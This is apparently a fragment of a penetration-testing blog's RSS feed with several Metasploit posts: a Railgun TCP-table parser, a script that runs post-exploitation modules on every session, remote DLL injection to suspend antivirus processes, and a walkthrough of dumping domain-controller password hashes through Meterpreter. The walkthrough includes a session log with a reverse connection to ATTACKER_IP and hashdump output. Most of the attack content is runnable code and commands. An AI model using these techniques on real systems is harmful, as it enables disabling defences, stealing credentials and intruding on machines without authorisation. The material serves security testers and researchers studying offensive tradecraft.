+&lt;p&gt;session.railgun.add_function(&amp;lsquo;iphlpapi&amp;rsquo;, &amp;lsquo;GetTcpTable&amp;rsquo;, &amp;lsquo;DWORD&amp;rsquo;, [&lt;/p&gt;
+
+&lt;p&gt;[&amp;lsquo;PBLOB&amp;rsquo;, &amp;lsquo;pTcpTable&amp;rsquo;, &amp;lsquo;out&amp;rsquo;],&lt;/p&gt;
+
+&lt;p&gt;[&amp;lsquo;PDWORD&amp;rsquo;, &amp;lsquo;pdwSize&amp;rsquo;, &amp;lsquo;inout&amp;rsquo;],&lt;/p&gt;
+
+&lt;p&gt;[&amp;lsquo;BOOL&amp;rsquo;, &amp;lsquo;bOrder&amp;rsquo;, &amp;lsquo;in&amp;rsquo;]&lt;/p&gt;
+
+&lt;p&gt;])&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;Then gauge the size of the table:&lt;/p&gt;
+
+&lt;p&gt;getsize = session.railgun.iphlpapi.GetTcpTable(4,4,true)&lt;/p&gt;
+
+&lt;p&gt;buffersize = getsize[&amp;lsquo;pdwSize&amp;rsquo;]&lt;/p&gt;
+
+&lt;p&gt;Run the call again with the correct buffer size:&lt;/p&gt;
+
+&lt;p&gt;tcptable = session.railgun.iphlpapi.GetTcpTable(buffersize,buffersize,true)&lt;/p&gt;
+
+&lt;p&gt;Then it&amp;rsquo;s all just parsing the result. Also pretty straight forward. First we get the number of entries which is held in the first 4 bytes, then just parse the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366917%28v=vs.85%29.aspx&#34;&gt;MIB_TCPTABLE&lt;/a&gt; one &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa366909%28v=vs.85%29.aspx&#34;&gt;MIB_TCPROW&lt;/a&gt; at a time (translating the state to something readable):&lt;/p&gt;
+
+&lt;p&gt;def parse_tcptable(buffer)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;  entries = buffer[0,4].unpack(&amp;ldquo;V*&amp;ldquo;)[0]&lt;/p&gt;
+
+&lt;p&gt;  print_status(&amp;ldquo;Total TCP Entries: #{entries}&amp;ldquo;)&lt;/p&gt;
+
+&lt;p&gt; &lt;/p&gt;
+
+&lt;p&gt;  rtable = Rex::Ui::Text::Table.new(&lt;/p&gt;
+
+&lt;p&gt;    &amp;lsquo;Header&amp;rsquo; =&amp;gt; &amp;lsquo;Routing Table&amp;rsquo;,&lt;/p&gt;
+
+&lt;p&gt;    &amp;lsquo;Indent&amp;rsquo; =&amp;gt; 2,&lt;/p&gt;
+
+&lt;p&gt;    &amp;lsquo;Columns&amp;rsquo; =&amp;gt; [&amp;lsquo;STATE&amp;rsquo;, &amp;lsquo;LHOST&amp;rsquo;, &amp;lsquo;LPORT&amp;rsquo;, &amp;lsquo;RHOST&amp;rsquo;, &amp;lsquo;RPORT&amp;rsquo;]&lt;/p&gt;
+
+&lt;p&gt;  )&lt;/p&gt;
+
+&lt;p&gt;  offset = 4&lt;/p&gt;
+
+&lt;p&gt;  (1..entries).each do&lt;/p&gt;
+
+&lt;p&gt;    x = {}&lt;/p&gt;
+
+&lt;p&gt;    x[:state] = case buffer[(offset + 0), 4].unpack(&amp;ldquo;V*&amp;ldquo;)[0]&lt;/p&gt;
+
+&lt;p&gt;      when 1&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;CLOSED&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 2&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;LISTEN&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 3&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;SYN_SENT&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 4&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;SYN_RCVD&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 5&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;ESTABLISHED&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 6&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;FIN_WAIT1&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 7&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;FIN_WAIT2&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 8&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;CLOSE_WAIT&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 9&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;CLOSING&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 10&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;LAST_ACK&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 11&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;TIME_WAIT&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      when 12&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;DELETE_TCB&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      else&lt;/p&gt;
+
+&lt;p&gt;        &amp;lsquo;UNDEFINED&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;      end&lt;/p&gt;
+
+&lt;p&gt;    x[:lhost] = Rex::Socket.addr_itoa(buffer[(offset + 4), 4].unpack(&amp;ldquo;N&amp;rdquo;)[0])&lt;/p&gt;
+
+&lt;p&gt;    x[:lport] = buffer[(offset + 8), 4].unpack(&amp;ldquo;n&amp;rdquo;)[0]&lt;/p&gt;
+
+&lt;p&gt;    x[:rhost] = Rex::Socket.addr_itoa(buffer[(offset + 12), 4].unpack(&amp;ldquo;N&amp;rdquo;)[0])&lt;/p&gt;
+
+&lt;p&gt;    if x[:state] == &amp;ldquo;LISTEN&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;      x[:rport] = &amp;ldquo;_&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;    else&lt;/p&gt;
+
+&lt;p&gt;    x[:rport] = buffer[(offset + 16), 4].unpack(&amp;ldquo;n&amp;rdquo;)[0]&lt;/p&gt;
+
+&lt;p&gt;    end&lt;/p&gt;
+
+&lt;p&gt;  offset = offset + 20&lt;/p&gt;
+
+&lt;p&gt;  rtable &amp;lt;&amp;lt; [x[:state], x[:lhost], x[:lport], x[:rhost], x[:rport]]&lt;/p&gt;
+
+&lt;p&gt;  end&lt;/p&gt;
+
+&lt;p&gt;  print_status(rtable.to_s)&lt;/p&gt;
+
+&lt;p&gt;end&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Run POST Modules On All Sessions</title>
+      <link>http://localhost:1313/post/2011/2011111run-post-modules-on-all-sessions-html/</link>
+      <pubDate>Wed, 02 Nov 2011 03:06:18 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2011/2011111run-post-modules-on-all-sessions-html/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jcran&#34;&gt;Jcran&lt;/a&gt; recently blogged about an easy way to run a post module on all sessions:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://blog.pentestify.com/simple-framework-domain-token-scanner&#34;&gt;http://blog.pentestify.com/simple-framework-domain-token-scanner&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
+msf enum_domain_tokens&amp;gt; irb
+framework.sessions.each do |session|
+  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
+  run_single(&amp;quot;run&amp;quot;)
+  sleep 1
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.&lt;/p&gt;
+
+&lt;p&gt;Thinking back to &lt;a href=&#34;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&#34;&gt;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&lt;/a&gt; and my rapid file PSEXEC resource file, we know we can run ruby inside of resource files with the &lt;ruby&gt; tag.&lt;/p&gt;
+
+&lt;p&gt;Save the following as runall.rc somewhere where you&amp;rsquo;ll remember:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;framework.sessions.each do |session|
+  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
+  print_status(&amp;quot;Running #{active_module.fullname} against session #{session.first}&amp;quot;)
+  run_single(&amp;quot;run&amp;quot;)
+  sleep 1
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then when you want to run a POST module against every session you have you simply do:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
+msf enum_domain_tokens&amp;gt; resource runall.rc
+[*] Running post/windows/gather/enum_domain_tokens on session 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-11-06 20:05 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;A commenter noticed an error in the coding for cross compatibility. The following should work better across versions:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;framework.sessions.each_key do |session|
+  run_single(&amp;quot;set SESSION #{session}&amp;quot;)
+  print_status(&amp;quot;Running #{active_module.fullname} against session #{session}&amp;quot;)
+  run_single(&amp;quot;run&amp;quot;)
+  sleep 1
+end
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class - Video</title>
+      <link>http://localhost:1313/post/2011/2011106the-dirty-little-secrets-they-didnt-teach-you-in-pentesting-html/</link>
+      <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2011/2011106the-dirty-little-secrets-they-didnt-teach-you-in-pentesting-html/</guid>
+      <description>&lt;p&gt;[youtube &lt;a href=&#34;http://www.youtube.com/watch?v=xXqyogdxITE&amp;amp;w;=560&amp;amp;h;=315&#34;&gt;http://www.youtube.com/watch?v=xXqyogdxITE&amp;amp;w;=560&amp;amp;h;=315&lt;/a&gt;]&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Remote DLL Injection with Meterpreter</title>
+      <link>http://localhost:1313/post/2011/2011530remote-dll-injection-with-meterpreter-html/</link>
+      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2011/2011530remote-dll-injection-with-meterpreter-html/</guid>
+      <description>&lt;p&gt;Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: &lt;a href=&#34;http://blog.didierstevens.com/2011/04/27/suspender-dll/&#34;&gt;http://blog.didierstevens.com/2011/04/27/suspender-dll/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.&lt;/p&gt;
+
+&lt;p&gt;I still stand by my original claim that just removing it is easier (&lt;a href=&#34;http://localhost:1313/blog/2010/11/16/silently-uninstall-sep.html&#34;&gt;Blog Post: Silently Uninstall SEP&lt;/a&gt;). However that might be something the user notices (A little shield disappearing).&lt;/p&gt;
+
+&lt;p&gt;Well, I didn&amp;rsquo;t know how to do this with meterpreter so a bit of google fu landed me on: &lt;a href=&#34;http://www.codeproject.com/KB/threads/winspy.aspx&#34;&gt;http://www.codeproject.com/KB/threads/winspy.aspx&lt;/a&gt; which has 3 different ways to attack the 2nd of which used a DLL (score!)&lt;/p&gt;
+
+&lt;p&gt;Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)&lt;/p&gt;
+
+&lt;p&gt;I start off setting up some variables after I&amp;rsquo;ve uploaded Suspender.dll:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;pid = 1436
+sizeofsuspend = 52376
+pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Next up we need to open a handle on the target process:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)[&amp;quot;return&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;With the handle we allocate some memory in the remote process for our DLL to live in:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)[&amp;quot;return&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Writing that DLL to memory isn&amp;rsquo;t much harder: (&lt;em&gt;&lt;strong&gt;this and the previous step is the wrong way to do things as we&amp;rsquo;ll see later&lt;/strong&gt;&lt;/em&gt;)&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn&amp;rsquo;t figure this one out, here is the best I did:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;pid = 1436
+pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in &lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765&#34;&gt;r12765&lt;/a&gt;. We generate the payload with it pointing at our Suspender DLL:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
+pay.datastore[&#39;DLL&#39;] = pathtosuspend
+pay.datastore[&#39;EXITFUNC&#39;] = &#39;thread&#39;
+raw = pay.generate
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Open the process, this time with Rex:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Allocate the memory in the remote process write the payload (not our DLL) into that space:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
+targetprocess.memory.write(mem, raw)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;targetprocess.thread.create(mem, 0)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;And 10 seconds later our AV and all it&amp;rsquo;s children processes stop. Suspended by Didier&amp;rsquo;s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
+      <link>http://localhost:1313/post/2011/2011515dumping-hashes-on-win2k8-r2-x64-with-metasploit-html/</link>
+      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2011/2011515dumping-hashes-on-win2k8-r2-x64-with-metasploit-html/</guid>
+      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
+ ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##
+
+
+       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
++ -- --=[ 687 exploits - 364 auxiliary - 43 post
++ -- --=[ 217 payloads - 27 encoders - 8 nops
+       =[ svn r12622 updated today (2011.05.15)
+
+msf &amp;gt; 
+[*] DC_IP:49220 Request received for /AYSBk...
+[*] DC_IP:49220 Staging connection for target YSBk received...
+[*] Patching Target ID YSBk into DLL
+[*] DC_IP:49221 Request received for /BYSBk...
+[*] DC_IP:49221 Stage connection for target YSBk received...
+[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011
+
+msf &amp;gt; sessions -i 7
+[*] Starting interaction with 7...
+
+meterpreter &amp;gt; sysinfo
+System Language : en_US
+OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
+Computer        : DOMAINCONTROLLE
+Architecture    : x64 (Current Process is WOW64)
+Meterpreter     : x86/win32
+
+meterpreter &amp;gt; ps
+
+Process list
+============
+
+ PID   Name                                       Arch  Session  User                          Path
+ ---   ----                                       ----  -------  ----                          ----
+ 0     [System Process]                                                                        
+ 4     System                                     x64   0                                      
+ 224   smss.exe                                   x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32smss.exe
+ 324   csrss.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32csrss.exe
+ 364   csrss.exe                                  x64   1        NT AUTHORITYSYSTEM           C:WindowsSystem32csrss.exe
+ 372   wininit.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wininit.exe
+ 404   winlogon.exe                               x64   1        NT AUTHORITYSYSTEM           C:WindowsSystem32winlogon.exe
+ 468   services.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32services.exe
+ 476   lsass.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32lsass.exe
+ 484   lsm.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32lsm.exe
+ 628   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
+ 708   svchost.exe                                x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe
+ 804   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 836   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
+ 880   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 932   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
+ 972   svchost.exe                                x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe
+ 328   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 1172  spoolsv.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32spoolsv.exe
+ 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITYSYSTEM           C:WindowsADWSMicrosoft.ActiveDirectory.WebServices.exe
+ 1252  dfsrs.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dfsrs.exe
+ 1288  dns.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dns.exe
+ 1316  ismserv.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32ismserv.exe
+ 1360  svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 1392  vmtoolsd.exe                               x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware Toolsvmtoolsd.exe
+ 1464  wlms.exe                                   x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wlmswlms.exe
+ 1492  dfssvc.exe                                 x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dfssvc.exe
+ 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware ToolsVMUpgradeHelper.exe
+ 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware ToolsTPAutoConnSvc.exe
+ 2016  vds.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32vds.exe
+ 872   sppsvc.exe                                 x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32sppsvc.exe
+ 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wbemWmiPrvSE.exe
+ 2360  taskhost.exe                               x64   1        SITTINGDUCKjuser             C:WindowsSystem32taskhost.exe
+ 2424  dwm.exe                                    x64   1        SITTINGDUCKjuser             C:WindowsSystem32dwm.exe
+ 2452  explorer.exe                               x64   1        SITTINGDUCKjuser             C:Windowsexplorer.exe
+ 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsTPAutoConnect.exe
+ 2512  conhost.exe                                x64   1        SITTINGDUCKjuser             C:WindowsSystem32conhost.exe
+ 2632  VMwareTray.exe                             x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsVMwareTray.exe
+ 2640  VMwareUser.exe                             x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsVMwareUser.exe
+ 2716  mmc.exe                                    x64   1        SITTINGDUCKjuser             C:WindowsSystem32mmc.exe
+ 3052  mscorsvw.exe                               x86   0        NT AUTHORITYSYSTEM           C:WindowsMicrosoft.NETFrameworkv4.0.30319mscorsvw.exe
+ 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITYSYSTEM           C:WindowsservicingTrustedInstaller.exe
+ 1932  mscorsvw.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsMicrosoft.NETFramework64v4.0.30319mscorsvw.exe
+ 2564  svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 1732  msdtc.exe                                  x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32msdtc.exe
+ 2992  notepad.exe                                x86   1        SITTINGDUCKjuser             C:WindowsSysWOW64notepad.exe
+ 1720  notepad.exe                                x64   1        SITTINGDUCKjuser             C:WindowsSystem32notepad.exe
+
+
+meterpreter &amp;gt; getpid
+Current pid: 2992
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
+============================================================
+Enabled Process Privileges
+============================================================
+  SeDebugPrivilege
+  SeIncreaseQuotaPrivilege
+  SeMachineAccountPrivilege
+  SeSecurityPrivilege
+  SeTakeOwnershipPrivilege
+  SeLoadDriverPrivilege
+  SeSystemProfilePrivilege
+  SeSystemtimePrivilege
+  SeProfileSingleProcessPrivilege
+  SeIncreaseBasePriorityPrivilege
+  SeCreatePagefilePrivilege
+  SeBackupPrivilege
+  SeRestorePrivilege
+  SeShutdownPrivilege
+  SeSystemEnvironmentPrivilege
+  SeChangeNotifyPrivilege
+  SeRemoteShutdownPrivilege
+  SeUndockPrivilege
+  SeEnableDelegationPrivilege
+  SeManageVolumePrivilege
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
+...got system (via technique 1).
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
+[*] Migrating to 1720...
+[*] Migration completed successfully.
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
+
+
+
+
+
+
+
+
+
+
+meterpreter &amp;gt; hashdump 
+
+
+
+
+
+
+
+
+
+
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
+[*] Migrating to 1288...
+[*] Migration completed successfully.
+
+meterpreter &amp;gt; hashdump
+Administrator:500:MYLMHASH:MYNTLMHASH:::
+Guest:501:MYLMHASH:MYNTLMHASH:::
+krbtgtG:502:MYLMHASH:MYNTLMHASH:::
+Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
+juserN:1104:MYLMHASH:MYNTLMHASH:::
+jane.user??:1105:MYLMHASH:MYNTLMHASH:::
+DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::
+
+meterpreter &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Silently uninstall SEP</title>
+      <link>http://localhost:1313/post/2010/silently-uninstall-sep-html/</link>
+      <pubDate>Tue, 16 Nov 2010 05:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/silently-uninstall-sep-html/</guid>
+      <description>&lt;p&gt;Uninstallation is not new&lt;/p&gt;
+
+&lt;p&gt;Deleting and removing things on a box you own isn&amp;rsquo;t new&lt;/p&gt;
+
+&lt;p&gt;This method and how to do it remotely was &lt;a href=&#34;http://it.toolbox.com/blogs/locutus/how-to-silently-and-remotely-remove-symantec-antivirus-14625&#34;&gt;posted in Feb 2007&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;But I didn&amp;rsquo;t know how to do it, and I thought it was hilarious, so I made a video:&lt;/p&gt;
+
